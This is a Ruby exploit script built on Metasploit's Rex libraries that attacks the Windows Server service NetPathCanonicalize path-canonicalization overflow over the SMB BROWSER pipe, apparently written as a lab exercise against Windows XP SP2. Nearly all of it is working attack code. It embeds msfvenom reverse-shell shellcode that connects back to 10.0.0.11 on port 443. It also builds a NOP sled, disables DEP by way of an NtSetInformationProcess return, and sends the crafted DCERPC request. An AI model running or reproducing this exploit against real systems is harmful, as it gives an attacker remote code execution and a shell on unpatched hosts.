#!/usr/bin/ruby
#encoding: ascii-8bit
#tested on XPSP2

require "rex"
ip = "10.0.0.8"
port = 445
pipe = "BROWSER"

sock = Rex::Socket::Tcp.create("PeerHost"=>ip, "PeerPort"=>port)	#require Rex::Socket to be used with other Rex
smb = Rex::Proto::SMB::SimpleClient.new(sock, direct=true)		#create simple SMB client with SMB over TCP(direct=true)
smb.login								
smb.connect("\\\\#{ip}\\IPC$")

def unicode(str)
  str.bytes.map{|b|[b].pack("v")}.join 
end

#badchaar = -b '\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40'
#root@kali:~/Desktop# msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=10.0.0.11 EXITFUNC=thread -b '\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40' -v shell -f ruby
#Payload size: 348 bytes
shell = 
"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76" +
"\x0e\xb7\xf4\x92\xc2\x83\xee\xfc\xe2\xf4\x4b\x1c\x10\xc2" +
"\xb7\xf4\xf2\x4b\x52\xc5\x52\xa6\x3c\xa4\xa2\x49\xe5\xf8" +
"\x19\x90\xa3\x7f\xe0\xea\xb8\x43\xd8\xe4\x86\x0b\x3e\xfe" +
"\xd6\x88\x90\xee\x97\x35\x5d\xcf\xb6\x33\x70\x30\xe5\xa3" +
"\x19\x90\xa7\x7f\xd8\xfe\x3c\xb8\x83\xba\x54\xbc\x93\x13" +
"\xe6\x7f\xcb\xe2\xb6\x27\x19\x8b\xaf\x17\xa8\x8b\x3c\xc0" +
"\x19\xc3\x61\xc5\x6d\x6e\x76\x3b\x9f\xc3\x70\xcc\x72\xb7" +
"\x41\xf7\xef\x3a\x8c\x89\xb6\xb7\x53\xac\x19\x9a\x93\xf5" +
"\x41\xa4\x3c\xf8\xd9\x49\xef\xe8\x93\x11\x3c\xf0\x19\xc3" +
"\x67\x7d\xd6\xe6\x93\xaf\xc9\xa3\xee\xae\xc3\x3d\x57\xab" +
"\xcd\x98\x3c\xe6\x79\x4f\xea\x9c\xa1\xf0\xb7\xf4\xfa\xb5" +
"\xc4\xc6\xcd\x96\xdf\xb8\xe5\xe4\xb0\x0b\x47\x7a\x27\xf5" +
"\x92\xc2\x9e\x30\xc6\x92\xdf\xdd\x12\xa9\xb7\x0b\x47\x92" +
"\xe7\xa4\xc2\x82\xe7\xb4\xc2\xaa\x5d\xfb\x4d\x22\x48\x21" +
"\x05\xa8\xb2\x9c\x98\xc2\xb7\xff\xfa\xc0\xb7\xf5\x29\x4b" +
"\x51\x9e\x82\x94\xe0\x9c\x0b\x67\xc3\x95\x6d\x17\x32\x34" +
"\xe6\xce\x48\xba\x9a\xb7\x5b\x9c\x62\x77\x15\xa2\x6d\x17" +
"\xdf\x97\xff\xa6\xb7\x7d\x71\x95\xe0\xa3\xa3\x34\xdd\xe6" +
"\xcb\x94\x55\x09\xf4\x05\xf3\xd0\xae\xc3\xb6\x79\xd6\xe6" +
"\xa7\x32\x92\x86\xe3\xa4\xc4\x94\xe1\xb2\xc4\x8c\xe1\xa2" +
"\xc1\x94\xdf\x8d\x5e\xfd\x31\x0b\x47\x4b\x57\xba\xc4\x84" +
"\x48\xc4\xfa\xca\x30\xe9\xf2\x3d\x62\x4f\x72\xdf\x9d\xfe" +
"\xfa\x64\x22\x49\x0f\x3d\x62\xc8\x94\xbe\xbd\x74\x69\x22" +
"\xc2\xf1\x29\x85\xa4\x86\xfd\xa8\xb7\xa7\x6d\x17"

ret = 0x6f88f727				#call esi
scratch = 0x00020408				#ExecuteFlags - 8 address (overwritten in EBP)	
						#code in 0x6f8916e2 will use [EBP + 8], so this address nust be #ExecuteFlags - 8
disableNX = 0x6f8916e2				#ntdll.ntSetInformationProcess(
							#NtCurrentProcess() ->	Static value, set to 0xFFFFFFFF
							#ProcessExecuteFlags ->	Static value, set to 0x22
							#&ExecuteFlags ->	Pointer to 0x00000002, may be a static address hardcoded in your sploit, but must be writeable
							#sizeOf(ExecuteFlags)->	Static value, set to 0x4
						#)
path = "" 
path << unicode('\\')
#path << "\xcc"*600				#Shellcode buffer size 600
path << "\x90"*200				#sled pad
path << shell					#Shellcode
path << unicode('\\..\\..\\')			#Relative path to trigger the bug
path << unicode("c"*7)				#Extra padding
path << [scratch].pack('V') 			#EBP Writable memory location (static) with 02
path << [disableNX].pack('V')			#EIP ret to ntdll.ntSetInformationProcess
path << "X"*4					#4 byte pad
path << [ret].pack("V")				#return from disableNX -> call esi
path << "\x90"*58				#sled to jmp to shell
path << "\x90\x90\xeb\x1b"			#jmp over itself(got mangled), slide down to shellcode
path << "\x00" * 2				#NULL termination unicode
path << "\x00" if(path.bytesize % 2 != 0) 	#cap off with null if not even size

server = "SERVER" + "\x00"
prefix = "\\\x00"   

stub =	""					#server UNC
stub << [rand(0xffffffff)].pack("V")		#reference ID 
stub << [server.bytesize].pack("V") 		#server UNC max buff count(character)
stub << [0].pack("V") 				#offset
stub << [server.bytesize].pack("V") 		#server UNC actual buff count
stub << unicode(server)				#server UNC unicode
stub << "\x00"*(4 - unicode(server).bytesize & 3)
#stub << "\x00"*(4 - server.bytes.map{|b|[b].pack("v")}.join.bytesize & 3)
						#padd nul bytes

						#RPC path
stub << [path.bytesize / 2].pack("V")		#RPC path max buff count(character) 
stub << [0].pack("V") 				#offset
stub << [path.bytesize / 2].pack("V") 		#RPC path actual buff
stub << path 					#path
stub << "\x00"*(4 - path.bytesize & 0x03)	#padd nul bytes

stub << [rand(1024)].pack("V")			#prefic pad
stub << [prefix.bytesize].pack("V") 		#max buf count
stub << [0].pack("V") 				#offset
stub << [prefix.bytesize].pack("V") 		#actual buf count
stub << unicode(prefix)				#prefix unicode
stub << "\x00"*(4 - unicode(prefix).bytesize & 3)
						#padd nul bytes
stub << [4097].pack("V") 			#path type
stub << [0].pack("V")				#flags

p stub
puts"-"*80
puts stub.unpack("H*")

##handle = Rex::Proto::DCERPC::Handle.new([uuid, version], protocol, rhost, [opts])
handle = Rex::Proto::DCERPC::Handle.new(["4b324fc8-1670-01d3-1278-5a47bf6ee188", "3.0"], "ncacn_np", ip, ["\\#{pipe}"])

#p Rex::Proto::DCERPC::Client.new(handle, sock)
#automatically calls smb sinokeClient but will fail, so pass in smb simpleClient object in options to bypass the error
#usr/lib/ruby/vendor_ruby/rex/proto/dcerpc/client.rb:126:in `smb_connect': undefined method `read_timeout=' 
#for #<Rex::Proto::SMB::SimpleClient:0x000055f77ce237d0> (NoMethodError) 

dcerpc = Rex::Proto::DCERPC::Client.new(handle, sock, {"smb_client"=>smb})
dcerpc.call(0x1f, stub, false)			#from wiresherk 0x1f = op 31 = netPathCanonicalize
sock.close
